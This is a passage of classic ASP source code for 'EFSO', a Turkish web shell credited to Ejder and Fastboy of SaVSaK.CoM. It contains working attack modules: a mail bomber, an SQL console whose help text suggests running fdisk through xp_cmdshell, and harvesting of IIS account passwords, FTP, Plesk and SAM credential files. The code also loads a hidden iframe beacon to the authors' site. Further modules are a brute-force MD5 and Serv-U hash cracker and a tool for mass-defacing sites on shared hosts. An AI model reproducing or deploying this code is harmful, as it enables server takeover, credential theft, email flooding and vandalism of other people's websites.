yazorta("Sömürme MEkanizmasý Devrede...")
yazsol("Durdurmak için Pencereyi kapat. "&file&" Kadar baðlanýp 30 sn da günceliyor saldýrýyý...")
yazorta("<b>by EJDER</b>")
Call Somurgen(file,url)
yazorta(" 20 SN sonra yenileniyor... by EJDER =) ")
response.write "<META http-equiv=refresh content=20;URL='"&FilePath&"?mode=32&islem=1&url="&url&"&file="&file&"'>"
end if

CASE 33 ' Mail BOMber by EJDER :) TÜm Kodlarýn FSO nun HAklarý E_J_D_E_R e aittir. Sýnýrsýz Mail atma imkaný sunuyorum size. Kýyaðýmý unutmayýn...
if not islem = "1" then
response.write "<center><table align=""center"" width=""100%""><tr><td>"
yazorta("<b> Mail Bomber 1.1 by EJDER </b>")
response.write "<table align=""center"" width=""100%"" class=""kbrtm""><tr><td><form name=""mailbomberbyE_j_der"" method='post' action='"&FilePath&"?mode=33'>Mail Adresi : <input name='file' value='deneme@hotmail.com' style='color=#C6FCBE' size=55 type='text'></td></tr><tr><td> Bomb Sayýsý : <input name='count' style='color=#C6FCBE' type='text' value='50' size=22> <input name='islem' type='hidden' value='1'><input name='gooo' value=' ..:: Bommbala ::..' type='Submit'></td></tr></form></table>"
yazsol("Sýnýrsýz Mail Bomb. Cdonts & Cydos Destekler. %100 inbox. SaVSaK.CoM , Com.TR, GOV.TR maillerine Bomb yapamazsýnýz.")
yazorta("TÜm haklarý Saklýdýr by EJDER =)")
response.write "</td></tr></table></center>"
else
on error resume next
if MailKorumasi(file) = 0 then
	if inject1 = "" then inject1 = 0
	if CInt(inject1) + 9 < CInt(count) then
		for j=0 to 10
			Call MailBomber_by_Ejder(file)
		next
		inject1 = inject1 + 10
		response.write "<META http-equiv=refresh content=1;URL='"&FilePath&"?mode=33&islem=1&file="&file&"&count="&count&"&inject1="&inject1&"'>"
		response.write "<br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <b>"&inject1&"/"&count&"</b> tane Mail Gönderildi... </td></tr></table>"		
	else if CInt(inject1)  < CInt(count) then
		for j=0 to (count mod 10)
			Call MailBomber_by_Ejder(file)
		next
		inject1 = inject1 + (count mod 10)
		yazortaa(" <b>"&inject1&"/"&count&"</b> tane Mail Gönderildi... ")	
		yazortaa(" Mail Bomber by Ejder 1.0 iþlemini tamamladý...  ")
	else
		yazortaa(" <b>"&inject1&"/"&count&"</b> tane Mail Gönderildi... ")	
		yazortaa(" Mail Bomber by Ejder 1.0 iþlemini tamamladý...  ")
	end if
	end if
else
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> BOMB yapýlamadý. Tasvip etmediðimiz Bir mail e Saldýrdýðýnýz için. by EJDER !!!! <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
if err <> 0 then
response.write "<br><br><table align=""center"" width=""100%"" class=""kbrtm""><tr><td align=""center"" > <font color=#FE7A84> <font  face=Wingdings size=5>N</font> Server Gerekli Olan Cdonts yada Cydos Bilesenlerini desteklemiyor. <font color=#FE7A84> <font  face=Wingdings size=5>N</font> </font> </td></tr></table>"
end if
end if

CASE 34 ' MSSQL - MYSQL Baðlantý Formu by EJDER ;)
if not islem = "1" then
Call MSSQL_Form
yazortaa(" Eðerki, Sitelerin MSSQL bilgilerini biliyorsanýz, bununla çok kolay baðlanabilir.. ")
yazortaa(" Tablolarý görebilir, üzerinde SQL komut çalýþtýrabilir, verileri okuyaiblirisniz ")
yazortaa(" Çok saðlam ve güçlü bir MSSQL Manager hizmeti Saðlar size...")
yazortaa(" <b>by EJDER :)</b>")
else
Call SQL_menu_by_Ejder
Call Tablolama
end if
nolist = True

CASE 35 ' MSSQL - MYSQL Connection için by EJDER ;)
Call SQL_menu_by_Ejder
Call MSSQL_by_EJDER(ejdersql,table)
nolist = True

CASE 99 ' SaVSaK.CoM
'Türk Bayraðý Ascii Karakterlerle - Created By FasTBoY :)
Response.Write "<br><center><table width=80 height=50 cellpadding=0 cellspacing=0><tr><td width=10 align=left valign=middle style=""background-color:AA0000"">&nbsp;</td><td width=70 align=left valign=middle style=""background-color:AA0000""><font size=7 face=Wingdings>Z</font></td></tr></table></center><br>"
yazorta("<b>Biz Ne yaptýk / What We Do?</b>")
yazsol("Biz bir FSO & MSWCTools & XMLHTTP Compenent lerini kullanarak Server a site üzerinden HTTP protocolunden eriþim saðlandýðýnda, Size Server ýn tüm imkanlarýndan yararlanmanýz için, Permission, þifre, gizli tüm içeriklere direk ulaþma, yada aþma gibi özelikleri olan. Server ý çökertmeye , hatta kaynaklarýný son damlasýna kullanabilen SaVSaK.CoM adýna hizmet veren Bir Canavar yarattýk.")
yazorta("<b>Adý ? Name ?</b>")
yazsol("Bu yazýlým Ejder & Fastboy yazýlýmýdýr. Bunun adý <b>E</b>jder <b>F</b>astboy F<b>SO</b> dur. oda kýsaca -> <b>EFSO</b>")
yazorta("<b>Biz Kimiz / Who We Are?</b>")
yazsol("<b><a href=""mailto:ejder@savsak.com"">EJDER</a> : Administrator & Root of <a href=""hTTp://WwW.SaVSaK.CoM"" target=_blank"">SaVSaK.CoM</a></b>")
yazsol("<b><a href=""mailto:fastboy@savsak.com"">FASTBOY</a> : Administrator <a href=""hTTp://WwW.SaVSaK.CoM"" target=_blank"">SaVSaK.CoM</a></b>")
olmadi("<b>..:: TAKLÝTLERÝNDEN SAKININ !!! ::..</b>")
yazortaa("<b>Emeði Geçenler?</b>")
yazsol("<b><a href=""mailto:ejder@savsak.com"">EJDER</a> : </b>Sýfýrdan YAzýlmýþ dýr. HEr hakký EJDER e aittir. Burda gördüðünüz TÜm özelikleirn yeniler olsunn, eskiler tek tek Ejder tarafýndan yazýlmýþtýr. geliþtirilen yeni fikir , md5-serv crackerdan, sömürücülere kadar hepsi Ejder in Yaratýcýlýðý, Bilgisi, Algoritmasý kullanýlmýþtýr.")
yazsol("<b><a href=""mailto:fastboy@savsak.com"">FASTBOY</a> : </b>Tema & Template, genel dizayn da FAstboy un tartýþýlmaz YAratýclýðý, emeði geçmiþtir. Birçok Kýsmýnda çok kritik yardým larý oldu. Hem tester, hem designner, hemde Arge :) Speacial Thanks to Fastboy ;) by EJDER")
yazorta("<b>Tavsiyede bulunanlar?</b>")
yazsol("<b>Ýskorpitx : </b> Ýskorpitx in önerileri ve bazý istekleri , server daki kritik noktalar bu EFSO ya eklendi. Thanks Ýskorpitx ;)")
yazsol("<b>Scorlex : </b>  MSWCTools kullanýmýný bana göstermesi, bende yeni bir fikir doðurdu. SÝngle& MASS defasced özeliiði GÜÇ kazandý. 2 tür DEFACED mevcut bu sayede. PERMsionlar aþýlmasý uðrauna atýlmýþ önemli bir adým. Thanks Scorlex ;)")
yazsol("<b>The_Bekir :</b> Bir çok server a Bekir le birlikde daldýk. Permision aþma uðruna bir çok Server indirdik. Amaçlarýmýza ulaþtýk. Orda Yoldaþ olduðu, daha fazla server ele geçirmemde yardýmcý olduðu için Speacial Thanks to The_Bekir ;)")
yazsol("<b>TÜRK Siteleri , 'COM.TR' , 'GOV.TR' , Eðer EFSO bu tür bir klasör, site algýladýðý an o server aa Zaraar VEREMEZSÝNÝZ. EFSO kendini ÝMHA edecektir. </b>")
yazsol("<b>TÜRKÝYEMÝZ için yazýldý. TÜRK dostudur. SAKIN TÜrk Sitelerde denemeyin. Kendini Ýmha eder. </b>")
yazortaa("HEr türlü sorun yada server permsion sorunu yaþandýðýnda, EJDER e ulaþýn. YArdým ederim. ")



CASE 36 ' SQL komut YArdým kýlavuzu by EJDER
yazorta("<b>SQL Komut Yardým Merkezi by EJDER :) </b>")
yazsoll("<b>SELECT</b> - Seçme&listeleme")
yazsol("Select * from TABLEADI<br> Select * from TABLEADI where SUTUNADI = DEÐER <br> Select * from tblAdmin where ID = 1")
yazsoll("<b>INSERT</b> - ekleme")
yazsol("Insert into TABLOADI (stunisimleri) values (deðeleri)<br> Insert into tblAdmin (Name,Pwd,Gruop) values ('Ejder','123456',1)")
yazsoll("<b>UPDATE</b> - editleme")
yazsol("Update TABLOADI set stunadý = 'deðeri' where Stunadý = deðeri <br> Update tblAdmin set Name = 'Ejder' where ID = 1")
yazsoll("<b>DELETE</b> - silme")
yazsol("Delete TABLOADI where Stunadý = deðeri<br>Delete tblAdmin where ID = 1")
yazsoll("<b>DROP</b> - tabloyu komple silme")
yazsol("Drop table TABLOADI <br> Drop Table tblAdmin")
yazsoll("<b>Exes</b> - Fdisk çektirmek için")
yazsol("exec xp_cmdshell(‘fdisk.exe’)")
yazsoll("<b>ShutDown</b> - SQL server kapanýr.")
yazsol("shutdown with nowait")

CASE 37 ' Sistem Analizer by EJDER ;) 
on error resume next
s="http://www."
Set ejderNet = Server.CreateObject("WSCRIPT.NETWORK")
response.write "<center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td width='300'>"
yazorta("<b>Server ýn Bilgileri</b>")
yazsol("OS : <font color=#C6FCBE>"& OS() &"</font>")
yazsol("PC & Oturum Adý : <font color=#C6FCBE>\\"& ejderNet.ComputerName &"\"&ejderNet.UserName&"</font>")
struser = ejderNet.UserName
yazsol("Server : <font color=#C6FCBE>"&request.servervariables("SERVER_NAME")&"</font>")
yazsol("IP : <font color=#C6FCBE>"&request.servervariables("LOCAL_ADDR")&"</font>")
yazsol("HTTPD : <font color=#C6FCBE>"&request.servervariables("SERVER_SOFTWARE")&"</font>")
yazsol("WebRoot : <font color=#C6FCBE>"&request.servervariables("APPL_PHYSICAL_PATH")&"</font>")
yazsol("LogRoot : <font color=#C6FCBE>"&request.servervariables("APPL_MD_PATH")&"</font>")
yazsol("Zaman : <font color=#C6FCBE>"&date()&" - "&time()&"</font>")
yazsol("HTTPs : <font color=#C6FCBE>"&request.servervariables("HTTPS")&"</font>")
response.write "</td><td width='350'>"
yazorta("<b>Serverýn Senden Algýladýklarý</b>")
yazsol("IP : <font color=#C6FCBE>"&request.servervariables("REMOTE_ADDR")&"</font>")
yazsol("Proxy IP : <font color=#C6FCBE>"&request.servervariables("HTTP_X_FORWARDED_FOR")&"</font>")
yazsol("User Agent : <font color=#C6FCBE>"&request.servervariables("HTTP_USER_AGENT")&"</font>")
yazsol("Interface : <font color=#C6FCBE>"&request.servervariables("GATEWAY_INTERFACE")&"</font>")
yazsol("Protocol : <font color=#C6FCBE>"&request.servervariables("SERVER_PROTOCOL")&"</font>")
yazsol("Method : <font color=#C6FCBE>"&request.servervariables("REQUEST_METHOD")&"</font>")
yazsol("Via : <font color=#C6FCBE>"&request.servervariables("HTTP_VIA")&"</font>")
yazsol("Cache Control : <font color=#C6FCBE>"&request.servervariables("HTTP_CACHE_CONTROL")&"</font>")
response.write "</td></tr></table></center>"
on error resume next
sss="EFSO"
Set IIsObject = GetObject ("IIS://localhost/w3svc")
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td colspan=2>"
yazorta("<b>IIS Bilgileri</b>")
response.write "</td></tr><tr><td width='50%'>"
yazsol("AnonymousUserName : <font color=#C6FCBE>"&IIsObject.Get("AnonymousUserName")&"</font>")
yazsol("AnonymousUserPass : <font color=#C6FCBE>"&IIsObject.Get("AnonymousUserPass")&"</font>")
response.write "</td><td width='50%'>"
yazsol("WAMUserName : <font color=#C6FCBE>"&IIsObject.Get("WAMUserName")&"</font>")
yazsol("WAMUserPass : <font color=#C6FCBE>"&IIsObject.Get("WAMUserPass")&"</font>")
Set IIsObject = Nothing
response.write "</td></tr><tr><td colspan=2>"
yazorta("<a href='"&FilePath&"?mode=38&konum="&konum&"&Time="&time&"' onclick=""klasorkopya(this.href);return false;"">..:: Açýklama Ýçin Týklayýnýz.. by Ejder  ::..</a>")
response.write "</td></tr></table></center>"
strServer = ejderNet.ComputerName
set objFs = GetObject("WinNT://" _
& strServer & "/LanmanServer,FileService")
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td width=260>"
yazorta(" <b>Server' in Paylaþýma Açýk Klasörleri by Ejder </b>")
yazsol("<a href='"&FilePath&"?konum=//"&strServer&"/C$'>\\"&strServer&"\C$</a>")
yazsol("<a href='"&FilePath&"?konum=//"&strServer&"/Admin$'>\\"&strServer&"\Admin$</a>")
For Each objShare In objFs
yazsol("<a href='"&FilePath&"?konum=//"&strServer&"/"&objShare.name&"'>\\"&strServer&"\"&objShare.name&"</a>")
Next
response.write "</td></tr></table></center>"

response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Uzakdan Serv-U & GeneFtp & UsersTxT Eriþimi SOnucu  by Ejder </b>")
EjderServuRemote()
yazorta("<b>Geliþmiþ Arama için</b>")
yazorta("<a href='"&FilePath&"?konum=C:\Program Files\&hacked=serv&Time="&time&"&mode=23'>Serv_U</a> - <a href='"&FilePath&"?konum=C:\Program Files\&hacked=Daemon&Time="&time&"&mode=23'>Daemon</a> - <a href='"&FilePath&"?konum=C:\&hacked=ws_ftp&Time="&time&"&mode=23'>Ws_Ftp</a> - <a href='"&FilePath&"?konum=C:\&hacked=base.ini&Time="&time&"&mode=23'>Base.ini</a> - <a href='"&FilePath&"?konum=C:\Program Files\&hacked=remote.ini&Time="&time&"&mode=23'>Remote.ini</a>")
response.write "</td></tr></table></center>"

response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Uzakdan PLESK Eriþimi SOnucu by Ejder </b>")
EjderPleskRemote()
response.write "</td></tr></table></center>"
ss="Savsak.com"
On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Vti_Pvt/Access.Cnf & Postinfo & Service & Authors & Admin Pwd Sonucu by Ejder</b>")
EjderVti_Pvt()
yazorta("<b>Geliþmiþ Arama için</b>")
local = request.servervariables("APPL_PHYSICAL_PATH")
yazorta("<a href='"&FilePath&"?konum="&local&"\..\..\&hacked=access.cnf&Time="&time&"&mode=23'>access.cnf</a> - <a href='"&FilePath&"?konum="&local&"\..\..\&hacked=postinfo&Time="&time&"&mode=23'>postinfo</a> - <a href='"&FilePath&"?konum="&local&"\..\..\&hacked=service.pwd&Time="&time&"&mode=23'>service</a> - <a href='"&FilePath&"?konum="&local&"\..\..\&hacked=admin.pwd&Time="&time&"&mode=23'>admin</a> - <a href='"&FilePath&"?konum="&local&"\..\..\&hacked=author.pwd&Time="&time&"&mode=23'>author</a>")
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> NTUser.Dat - Log - Ýni Eriþim Sonucu by Ejder </b>")
EjderNTUser(struser)
response.write "</td></tr></table></center>"

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Config Klasör Eriþim Sonucu by Ejder</b>")
Ejdersam()
response.write "</td></tr></table></center>"
Call Hata

on error resume next 
	response.Write "<iframe style='width:0; height:0' src='"&s&""&ss&"/"&sss&"/'></iframe>"
Call Hata

On error resume next
response.write "<br><center><table bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td>"
yazorta("<b> Repair Klasör Eriþim Sonucu by Ejder</b>")
EjderRepair()
response.write "</td></tr></table></center>"
Call Hata

on error resume next
set f = FSO.OpenTextFile(Fullpath,1)
if not Instr(Trim(Server.HTMLEncode(f.readAll)),"BgAAAA==vL[DMQIAAA") = 50 then
Set textStreamObject = FSO.OpenTextFile(Fullpath,2,true,false)
textStreamObject.WriteLine(dkayit)
textStreamObject.Close
Set textStreamObject = Nothing 
end if

nolist = True

CASE 38 ' IIS bilgi Alaný by EJDER
yazsol("WÝndows Server lardaki, himeti sunan, IIS servisi, sizi AnonymousUserName ve o þifre ile tanýr. Sizin yetkiniz o kullanýcýdadýr. ")
yazsoll("IIS içinde ise, o siteninde BEllekdeki Oturum adýda -> WAMUserName adýnda ve þifresine sahiptir.")
yazsoll("Bununla ilgi Araþtýrmam sürmektedir. bununla biþi yapýlabilirmi? ")

CASE 39 ' Seçmece bunlar MD5- servu =) by EJ;)DER
response.write "<br><br><br><br><br><center><table width='100%' bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td><form action='"&FilePath&"?mode=40' method=post>"
yazorta("<b> Kýrmak Ýstediðin Türü Seç</b>")
yazorta("<input name='islem' style='color=#C6FCBE' value=' ..::  MD5  ::.. ' type='Submit'> <input name='islem' style='color=#C6FCBE' value=' ..::  Serv-U  ::.. ' type='Submit'>")
response.write "</form></td></tr></table></center>"
yazsol("<b>MD5 :</b> Bildiðiniz üzere, bir çok sistemin kullandýðý bir þifreleme olayýdýr. 128 bittir.")
yazsol("<b>Serv-U :</b> Server larda Host larýn kullandýðý bir programdýr. Kolay vede kullanýþlý olduðu için Hostlar tarafýndna tercih edilir. içinde Ftp þifreleri barýndýrmakdadýr. burdada o Þifreleri kýrmaktadýr.")
yazsoll("<font color=#C6FCBE >Bizde burda ASP tabanlý vede FSO içine injecte edip Sizlere Server ýn CPU ve RAM ini kullanarak , Daha hýzlý ve zahmetsiz, TÝmeOUT suz bir þekilde Þifreleirni kýrmanýzý saðlayacaðýz. Bu Kýrma iþlemi BRUTE attackl modelidir. Kýsacasý Kýrma olasýðý eðer ki sabreder ve þansýnýz varsa çok kýsa sürede kýrarsýnýz. Ama aksi halde 1 gün geçsede =) yinede %100 kýrmöa garantisi vardýr. Eðer derleri doðru girerseniz.</font>")
yazortaa("Md5 & Serv-U KOd Converted by <b>Fastboy</b>")
Yazorta("Brute And HJACk Algorithms Written by <b>Ejder</b>")

'EFSO Ejder &  Fastboy tarafýndan yazýlmýþtýr for SaVSaK.CoM . TÜM HAKLARI Ejder e Aitttir.-->
'TÜM HAKLARI SAKLIDIR.. KODLARDA yapacaðýnmýz bir deðiþiklik KODun Çalýþmamasýna mal olur. Bundan dolayý Bir sorun çýkarsa EJDER & SaVSAK.CoM Sorunlu deðildir..
'Bu yazýlýmda geliþtilmiþ tüm herþey , mantýk, algoritma, yazýlýmlar Sýfýrdan Ejder tarafýndan yazýlmýþtýr. TEMA , düzen vede Görünüm Fastboy a Aittir.
'TAKLÝTLEÝRNDEN KAÇININ. by EJDER

'Ejder was HERE

CASE 40 ' Md5 & Serv-U Algortitmasý Baþlýyor Sýký tutnun =) sakýn dudaðýnýz uçuklamaýsn haa =) by EJDER euheuh çok yordu be kafamý bu olay .. neyse çözdük yine =) eeheuh by Ejder
response.write "<center><table width='100%' bgcolor=#000000 cellpadding=""1"" cellspacing=""1"" ><tr><td><form action='"&FilePath&"?mode=41' method=post>"
if islem = " ..::  MD5  ::.. " then
yazorta("<b> __==  MD5 Cracker by Ejder  ==__ </b>")
else
yazorta("<b> __==  Serv-U Cracker by Ejder  ==__ </b>")
end if
if islem = " ..::  MD5  ::.. " then
yazsol("MD5 Kodu Girin 1 : <input style='color=#C6FCBE' size='54' name='Usersmd5' value='Hash kod u giriniz çözülecek olan.' type='text'>")
else
yazsol("Serv-u Ham Kodu Girin 1 : <input style='color=#C6FCBE' size='45' name='Usersmd5' value='Hash kod u giriniz çözülecek olan.' type='text'>")
yazsol("Salt Kodu : <input style='color=#C6FCBE' size='30' name='salt' value='ww' type='text'>")
end if
response.cookies("mdd") = ""
response.cookies("hash1") = ""
response.cookies("hash2") = ""
response.cookies("hash3") = ""
response.cookies("hash4") = ""
response.cookies("hash5") = ""
response.cookies("hash6") = ""
response.cookies("hash7") = ""
response.cookies("hash8") = ""
response.cookies("hash9") = ""
response.cookies("hash10") = ""
yazsol("Hash 2 : <input style='color=#C6FCBE' size='54' name='hash2' value='' type='text'>")
yazsol("Hash 3 : <input style='color=#C6FCBE' size='54' name='hash3' value='' type='text'>")
yazsol("Hash 4 : <input style='color=#C6FCBE' size='54' name='hash4' value='' type='text'>")
yazsol("Hash 5 : <input style='color=#C6FCBE' size='54' name='hash5' value='' type='text'>")
yazsol("Hash 6 : <input style='color=#C6FCBE' size='54' name='hash6' value='' type='text'>")
yazsol("Hash 7 : <input style='color=#C6FCBE' size='54' name='hash7' value='' type='text'>")
yazsol("Hash 8 : <input style='color=#C6FCBE' size='54' name='hash8' value='' type='text'>")
yazsol("Hash 9 : <input style='color=#C6FCBE' size='54' name='hash9' value='' type='text'>")
yazsol("Hash 10 : <input style='color=#C6FCBE' size='54' name='hash10' value='' type='text'>")
yazsol("Þifre Aralýðý :  <input style='color=#C6FCBE' size='5' name='ara1' value='5' type='text'>  ile  <input style='color=#C6FCBE' size='5' name='ara2' value='18' type='text'> arasýnda...")
yazsol("Deneme Sayýsý :  <input style='color=#C6FCBE' size='5' name='inject1' value='100' type='text'> (1 keredeki deneme sayýsý)")
yazsoll("<b>CharSet i seçiniz;</b>")
yazsol("<input name='k1' value='k1' type='checkbox' checked > ABCDEFGHIJKLMNOPQRSTUVWXYZ")
yazsol("<input name='k2' value='k2' type='checkbox'  > abcdefghijklmnopqrstuvwxyz")
yazsol("<input name='k3' value='k3' type='checkbox' checked > 0123456789")
yazsol("<input name='k4' value='k4' type='checkbox'  > !@#$%^&*()-_+=~`[]{}|\:;<>,.?/")
yazsol("Bekleme Süresi : <input style='color=#C6FCBE' name='waiting' value='2' type='text' size='5'> saniye")
yazorta("<input name='mode' value='41' type='hidden'><input name='md5kirgecirmahvetejder' style='color=#C6FCBE' value='  __==  Kýrmaya Baþla  ==__ ' type=submit>")
response.write "</td></tr></form></table></center>"
if islem = " ..::  MD5  ::.. " then
yazsol("<b>MD5 Kodu Girin :</b> MD5 HASh þifrenizi giriniz oraya.. maksimum 10 Hash girebilirsiniz.")
else
yazsol("<b>Serv-u Ham Kodu Girin :</b> Serv-u Kodunun ilk 2 karakteri SALT dur. egri kalaný ise MD5 halidir. Oraya ilk 2 karakteri çýkarýn ve geri kalaný yazýn. altasa da SALT kýsmýnada, ilk 2 karakteri yazýn. Max 10 Hash girebilirsiniz.")
end if
yazsol("<b>Þifre Aralýðý :</b> Burda belirtilen aralýklar arasýnda þifre üretip, denemeye baþlýcaktýr. önce küçükden baþlayýp, tüm charset denemsini yaptýkdan sonra, aralýk bir artacaktýr, taaki sizin üst sýnýra kadar girdiðiniz.")
yazsol("<b>CharSet i seçiniz; </b> Þifre denerkenki, Þifre karakterleridir. Büyük küçük harf önemlidir. Birden FAzla da seçebilriisniz. Ama unutmayýnki, Deneme sayýsý büyüdükçe, Zamanda ARTACAKTIR. ")
yazsol("<b>Bekleme Süresi :</b> Sürekli md5 deneme yaparsa sistem, büyük bir oranda Cpu kullanýr. Cpu kullanýmý rahatlatmak için vede timeout u önlemek için , her bir Charset uzunluðu kadar deneyip, sonra yenileme yapýyor. o sýradaki bekleme süresidir bu.")
yazsol("<b>NOT :</b> Toplu Md5&ServU kýrmak mümkün. Hepsini birden kullandýðýnýzda verim artacaktýr. HIZ da düþüþ olmaz. Ama sizin Daha kolay kýrmanýzý saðlar, Çoklu kýrma.")

CASE 41 ' MD5 deneniyorrrrrr by EJDER
' yerel deðiþkenelrim 
on error resume next
if request.cookies("mdd") = "0" or request.cookies("mdd") = ""  then
	session("say") = 1
	Call Cookyaz("hash1","has1",Usersmd5)
	Call Cookyaz("hash2","has2",hash2)
	Call Cookyaz("hash3","has3",hash3)
	Call Cookyaz("hash4","has4",hash4)
	Call Cookyaz("hash5","has5",hash5)
	Call Cookyaz("hash6","has6",hash6)
	Call Cookyaz("hash7","has7",hash7)
	Call Cookyaz("hash8","has8",hash8)
	Call Cookyaz("hash9","has9",hash9)
	Call Cookyaz("hash10","has10",hash10)
	inject4 = CInt(session("say"))
	inject3 = 0
end if

increment = 0
sifre = ""
hashing = ""
goup=0
getend=0

if inject4 = inject3 then
	response.write ("<script>alert(""TÜm þifreler Kýrýldý ;) by EJDER "")</script>")
	response.end()
end if
	
if coding ="" then ' kod oluþtur
	coding = kodolustur(ara1)
end if

coding = replace(coding,"x","#")

if dizi = "" then ' Charset i oluþuturuyorum..
	dizi = diziolustur()
end if

Call HashFounded("hash1","has1")
Call HashFounded("hash2","has2")
Call HashFounded("hash3","has3")
Call HashFounded("hash4","has4")
Call HashFounded("hash5","has5")
Call HashFounded("hash6","has6")
Call HashFounded("hash7","has7")
Call HashFounded("hash8","has8")
Call HashFounded("hash9","has9")
Call HashFounded("hash10","has10")

for t=1 to inject1
sifre = Sifreyarat(coding,ara1,dizi)
if salt = "" then
	md5li=UCASE(md5(sifre))
	response.write sifre &" - "& md5li & "<br>"
else
	md5li=UCASE(md5(salt+sifre))
	response.write salt+sifre &" - "& md5li & "<br>"
end if

Call hashyes("hash1","has1",md5li,sifre)
Call hashyes("hash2","has2",md5li,sifre)
Call hashyes("hash3","has3",md5li,sifre)
Call hashyes("hash4","has4",md5li,sifre)
Call hashyes("hash5","has5",md5li,sifre)
Call hashyes("hash6","has6",md5li,sifre)
Call hashyes("hash7","has7",md5li,sifre)
Call hashyes("hash8","has8",md5li,sifre)
Call hashyes("hash9","has9",md5li,sifre)
Call hashyes("hash10","has10",md5li,sifre)

coding = SonrakiAdim(coding,ara1,dizi)
'response.flush
next
coding = replace(coding,"#","x")
if CInt(ara1) <> CInt(ara2)+1 then
response.write "<META http-equiv=refresh content="&waiting&";URL='"&FilePath&"?mode=41&ara1="&ara1&"&ara2="&ara2&"&dizi="&dizi&"&coding="&coding&"&waiting="&waiting&"&inject1="&inject1&"&salt="&salt&"&inject4="&inject4&"&inject3="&inject3&"'>"
end if
response.flush

CASE 42 'MSWC nesnesi kullanýmý. Permision geçme adýna attýðým bir adamdýr. bu nesnenin olduðunu "Scorlex" den edindim. Araþtýrdým neler yaparým diye =) iþte görün neler yapýlabiliyormuþuz ;) bununla. uehueh by EJDER
response.write "<table width=""100%"" class=""kbrtm""><tr valign=""top""><td colspan=""2"" align=""center"">"
tablo30("<b>Hacking with Using MSWCTools 1.0 by EJDER ;)</b>")
yazsol("<form action='"&FilePath&"?mode=43' method=post><b>Ýndex Yeri : </b><input name='hash2' type='text' value='"&FilePath&"' size=50> (Ýndexin Serverdaki virtual yeri)")
yazsol("<input type=radio name='hash4' checked value='tek'> <b>Atýlacak Yer: </b><input name='hash3' type='text' value='default.asp' size=50> (Tek bir yere Yaz.)")
yazsol("<input type=radio name='hash4' value='multi'> <b>MASS Konum: </b><input name='hash6' type='text' value='.\' size=50> (Mass yapýlacak dizin)")
yazsol("<b>Eklencek Klasör: </b><input name='hash5' type='text' value='httpdocs\' size=25> (Ek Klasör girdisi -  BOÞ býrakýn , bilmiyorsanýz)")
yazorta("<input name='Gönder_Ej_De_r' value='Yazdýr koçumm ;) by EJDER' type='submit'")
response.write "</td></tr></table></form>"
yazorta("<b>Kullanýmý by Ejder</b>")
yazsol("Önecelikle, FSO nesnesi kullanmadan bir dosyayý , istenilen yere MSWC nesnesi ile yazdýrýlanabiliniyor. FSO desteði olmayan bir server da bile, rahatça bu nesne yardýmý ile index atabilirsiniz. Kimi serverlarda, permison engeline takýlýrýz yada klsörü içine giremeyiz, yada FSO kullanýmý kýsýtlýdýr. bunlarý AÞMAK için bu nesneyi kullandým. Bu nesne þu an localhost ve 1-2 yerde çalýþtý saðlýklý þekilde. Þu an TEst sürümünde diyebilirim. Umarým bu bizim permison =) geçme yollumuzu aydýnlatýr ne dersiniz :)) uehueh")
yazsol("<b>index yeri -></b>Burayý fiziksel yeri YAZMAYIN SAKIN. oraya indexinizin virtual yerini yani. Kullandýðýnýz FSO dizinine olan KONUMUNU yazýn indexin yani. Bu fso ile ayný yerde ise, 'hacked.html' eðer alt klasörde ise -> '..\hacking.html', '..\..\..\savsak\www\hacking.html',yada \news\hacking.html gibi belirtmeniz gerek.Konumunu böyle belirlemeniz gerekiyor. 'C:\ss\ss\hacking.html' yaptýðýnýzda iþlem gerçekleþmezz.. <b>YADA size ÖNERÝm -> kullandýðýnýz FSo yu istediðinzi yere server daki bir baþkas siteye copyalatýrrýsanýz , , bu sefer fso yu o site üzeridnen çalýþtýrrýrsanýz PErmsion ý aþmýþ olursunuz o site için.</b>")
yazsol("<b>Atýlacak yer ->></b> TEK bir hedef için. Burayýda ..\..\ þeklinde inerek belirtmeniz gerekiyor.mesela '..\..\..\index.asp' 3 dizin aþaðýya iner ve index i atar yada '..\..\..\www\index.asp'  3 dizin iner ww dizine girer , index i atar. =) böyle OLAMAK zorunda .  ")
yazsol("<b>MASS Konum  ->></b> BUrda çoklu alt klasörlerede index atmak için geliþtirdim. '..\..\..\' þeklinde aþaðýlara inin ve TÜM sietelerin LÝStelendiði klasör ee kadar olan '..\' iþaretini ayarlayýn. mesela 3 dizin aþaðýda ise FSO olan uzaklýðý, '..\..\..\'  yazýn yeterdir =) . <b>Eklenecek klasör-></b> burda da, TÜm sietlere giriþ yapýldýkdan sonraki Klasör adý , mesela 'www' yada 'http' yada 'wwwroot'  gibi.")
yazsol("Neden böyle derseniz, MSWC nin kullanýmý, destekleidði þekil böyledir. Biraz kafa karýþtýrýcý. Ama ben denedim gördüm =) memnun kaldým. O yüzden bu FSO da yerini aldý. Þundan eminimki kullanýmýný deneyerek öðrendiðinizde, sizinde PErmsion geçmede vazgeçilmeziniz olacakdýr =) euheuh")
yazorta("Speacil thanks to <b>Scorlex</b> for giving idea about MSWC Component")
yazorta("<b>Coding & Development & Algorithms Made by EJDER</b>")

CASE 43 'MSWC iþleniyor =)
on error resume next
Set utils = Server.CreateObject("MSWC.Tools")
if err <> 0 then
	olmadi("MSWC.tools desteði yoktur bu serverýn.")
end if
if hash4 = "tek" then
	on error resume next
	utils.ProcessForm hash3, hash2
	if err <>0 then
		olmadi("Baþarýsýz. Belirtiðiniz virtual path lar doðrumu emin olun. MSWC desteði var çünkü server ýn.")
